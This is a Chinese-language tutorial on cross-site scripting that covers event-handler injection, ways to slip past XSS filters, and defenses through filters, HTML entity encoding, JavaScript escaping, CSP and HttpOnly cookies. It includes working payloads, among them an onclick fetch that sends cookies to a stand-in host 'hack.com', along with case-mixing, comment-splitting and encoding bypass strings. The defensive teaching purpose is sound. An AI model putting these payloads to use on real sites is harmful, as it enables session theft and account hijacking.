# XSS 跨站脚本攻击 完整详解
## 一、XSS 基础概念
XSS 全称 **Cross-Site Scripting（跨站脚本攻击）**，为避免和 CSS 缩写冲突，简写 XSS。
核心原理：**攻击者将恶意 JS 脚本注入到网页中，其他用户访问页面时，浏览器会把恶意脚本当成正常代码执行，从而窃取用户数据、劫持会话、伪造操作**。
攻击目标：用户浏览器，利用网站信任漏洞，而非直接攻破服务器。

## 二、两类核心 XSS 攻击方式
### 1. 事件型 XSS（事件跨站脚本）
#### 原理
HTML 所有 DOM 事件（点击、加载、输入、鼠标悬浮等）均可嵌入 JS 代码，前端过滤只拦截 `<script>` 标签，却忽略事件属性，导致恶意脚本被执行。
常见事件：`onclick`、`onload`、`onerror`、`onmouseover`、`onfocus`、`onblur` 等。

#### 攻击示例
1. 图片加载失败触发 onerror（最经典）
页面展示用户上传头像，后端未过滤图片地址参数：
```html
<!-- 用户可控参数 imgUrl 直接拼入页面 -->
<img src="{{imgUrl}}" onerror="alert(document.cookie)">
```
攻击者传入恶意链接：
`imgUrl=x.jpg' onerror='stealCookie()'`
渲染后页面代码：
```html
<img src="x.jpg' onerror='stealCookie()'">
```
图片地址不存在，自动触发 `onerror`，执行偷 Cookie 脚本。

2. 点击事件 onclick
评论区直接渲染用户输入：
输入 payload：`test" onclick="fetch('https://hack.com?c='+document.cookie)" a="`
页面渲染：
```html
<div class="msg" onclick="fetch('https://hack.com?c='+document.cookie)">test</div>
```
其他用户点击评论，Cookie 自动发送到黑客服务器。

3. 通用 payload 模板
```
'" onmouseover="恶意JS" x="
'" onload="恶意JS" x="
'" onfocus="恶意JS" autofocus x="
```

#### 攻击危害
- 读取页面 Cookie、localStorage、sessionStorage
- 伪造当前用户身份发起接口请求（转账、改密码、发布内容）
- 劫持页面，弹出钓鱼窗口欺骗用户输入账号密码

### 2. 扰乱过滤规则 XSS（绕过过滤器 XSS）
#### 原理
网站后端/前端配置 XSS 过滤器，会拦截关键词如 `<script>`、`alert`、`javascript:`、`on` 等。攻击者通过**变形、编码、拆分、大小写、注释干扰**破坏过滤正则逻辑，绕过检测。

#### 常见绕过手段
1. 大小写混淆绕过（过滤器只匹配小写 script）
过滤器拦截 `<script>`，但不区分大小写：
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x oNError=alert(1)>
```

2. 插入注释、空格、换行拆分关键词
正则匹配连续字符，插入空白/注释打断关键词：
```html
<scr<!--aaa-->ipt>alert(1)</scr<!---->ipt>
<img src=x o n error=alert(1)>
```

3. URL/HTML 编码变形
将 JS 关键词转实体、URL 编码，过滤器解析前不会解码，直接放行，浏览器渲染时自动解码执行：
```html
<!-- javascript: 编码 -->
<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>click</a>
```

4. 拆分关键词、替换关键字
过滤拦截 `alert`，替换为 `top['ale'+'rt'](1)`、`eval`、`prompt` 等替代函数。

5. 伪协议绕过（javascript:、vbscript:）
过滤拦截 `javascript:`，通过换行、编码拆分：
```html
<a href="java
script:alert(1)">点我</a>
```

#### 核心逻辑
过滤规则存在**正则缺陷、未统一解码、只过滤固定关键词**，攻击者构造畸形 payload 让过滤器判定为无害内容，浏览器解析后恢复完整恶意脚本。

## 三、XSS 三大防御方案详解
### 1. XSS Filter（专用XSS过滤器）
#### 定义
服务端专用过滤中间件/工具，统一拦截、清洗用户输入的恶意 XSS 载荷，在数据存入数据库、渲染页面前统一处理，是第一层防御。
分类：框架内置过滤器、第三方过滤库、自定义正则过滤器。

#### 工作流程
用户提交数据 → XSS Filter 拦截检测 → 识别恶意标签/事件/伪协议 → 两种处理逻辑：
1. **转义**：危险字符转为 HTML 实体（和下文 html 实体配套）
2. **删除**：直接清除 `<script>`、on 事件、javascript: 等危险代码

#### 主流工具示例
- Java：OWASP HTML Sanitizer、Spring XSS Filter
- Python：bleach（最常用）
- PHP：HTMLPurifier
- Node.js：xss 库

#### 优缺点
优点：全局统一防护，所有接口共用一套规则，无需每个页面单独处理；提前拦截脏数据入库。
缺点：单一过滤容易被扰乱规则 payload 绕过，**不能单独依赖，必须配合转义使用**；自定义正则容易存在绕过漏洞，推荐成熟开源库而非手写正则。

### 2. HTML 实体编码（页面渲染最核心防御）
#### 原理
将 HTML 特殊语义字符转换为**HTML 实体编码**，浏览器渲染时只会展示文本，不会解析成 HTML/JS 标签，从根源杜绝脚本执行。
核心转换映射表：
| 原始字符 | HTML实体编码 | 作用               |
| -------- | ------------ | ------------------ |
| `<`      | `&lt;`       | 禁止开启标签       |
| `>`      | `&gt;`       | 禁止闭合标签       |
| `&`      | `&amp;`      | 防止实体解码混淆   |
| `"`      | `&quot;`     | 破坏引号闭合注入   |
| `'`      | `&#39;`      | 单引号属性注入防御 |

#### 使用场景
1. 变量插入 HTML 文本节点（div、p、span 内容）
不安全写法：
```html
<div>{{userInput}}</div>
```
用户输入 `<img src=x onerror=stealCookie()>`，浏览器解析为标签。

安全写法（实体编码后输出）：
```html
<div>&lt;img src=x onerror=stealCookie()&gt;</div>
```
页面仅展示纯文本 `<img src=x onerror=stealCookie()>`，不会执行脚本。

2. 变量插入 HTML 属性值（必须编码引号）
不安全：
```html
<input value="{{userInput}}">
```
输入 `test" onclick=alert(1) a="` 会闭合 value 属性注入事件。
编码后：
```html
<input value=&quot;test&quot; onclick=alert(1) a=&quot;>
```
引号失效，无法闭合属性。

#### 限制
HTML 实体编码仅适用于**HTML 上下文**（标签内、属性值）；
如果变量直接放入 `<script>` 标签、JS 变量、URL、CSS 中，HTML 实体编码无效，需要下文 JS 编码处理。

### 3. JavaScript 编码（JS上下文专用防御）
#### 适用场景
当用户可控变量直接嵌入 `<script>` 内部、JS 代码、JSON 字符串时，HTML 转义无效，必须使用 JS 转义编码。
示例危险场景：
```html
<script>
// userData 是用户可控输入
let name = "{{userData}}";
</script>
```
攻击者输入 `";stealCookie();//`，拼接后代码：
```js
let name = "";stealCookie();//";
```
直接逃逸字符串，执行恶意代码。

#### JS 编码规则
对所有特殊字符做 Unicode 转义 `\uXXXX`，规则：
1. 引号 `"` → `\u0022`，单引号 `'` → `\u0027`
2. 反斜杠 `\` → `\u005c`
3. 换行、回车、制表符全部转义
4. 小于号、大于号、& 统一 Unicode 编码

#### 安全示例
原始用户输入：`";stealCookie();//`
JS 编码后：`\u0022\u003bstealCookie\u0028\u0029\u003b\u002f\u002f`
页面渲染：
```js
let name = "\u0022\u003bstealCookie\u0028\u0029\u003b\u002f\u002f";
```
所有符号仅作为字符串内容，无法跳出字符串执行代码。

#### 补充场景延伸
1. URL 上下文：额外做 URL 编码
2. CSS 上下文：CSS Unicode 转义
不同代码环境必须使用对应编码，混用会产生防御失效漏洞。

## 四、三种防御配合使用最佳实践
完整防护链路（多层防御，纵深安全）：
1. 服务端入口：**XSS Filter** 清洗高危恶意载荷，拦截明显攻击；
2. 数据渲染区分上下文：
   - HTML 标签/属性中输出变量：**HTML 实体编码**；
   - script、JS 变量、JSON 中输出变量：**JavaScript 编码**；
3. 额外辅助防御：
   - HTTP 响应头 `Content-Security-Policy(CSP)` 禁止未授权脚本执行；
   - Cookie 添加 `HttpOnly`，阻止 JS 读取 Cookie；
   - 输入输出分离：不信任前端过滤，所有校验放在服务端。

## 五、核心总结
1. 事件型 XSS 利用 DOM 事件属性注入 JS，过滤只拦截 script 标签会产生漏洞；
2. 扰乱过滤规则 XSS 通过大小写、注释、编码变形绕过过滤器，手写正则极易被绕过；
3. XSS Filter 全局前置清洗，适合第一层拦截，不能单独作为防护；
4. HTML 实体编码解决 HTML 页面上下文注入，阻断标签解析；
5. JavaScript 编码专门防护 JS 代码块内变量注入，弥补 HTML 转义在 script 标签内失效的短板。